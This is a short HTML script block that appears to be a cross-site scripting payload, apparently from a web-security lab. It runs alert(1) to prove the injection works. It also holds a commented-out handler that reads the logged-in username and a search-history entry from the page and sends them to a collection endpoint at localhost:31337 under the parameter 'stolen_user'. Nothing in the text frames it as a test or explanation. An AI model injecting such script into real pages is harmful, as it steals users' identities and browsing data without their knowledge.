<script>
{/* $( document ).ready(function() {
    const loggedInUser = document.getElementById('logged-in-user').textContent;
    const lastRecord = document.getElementById('history-list').children[1].textContent;
    const xhr = new XMLHttpRequest();
    var url = "http://localhost:31337/?stolen_user=" + encodeURIComponent(loggedInUser) + "&last_search=" + encodeURIComponent(lastRecord);
    xhr.open("GET", url);
    xhr.send();
}); */}
alert(1);
</script>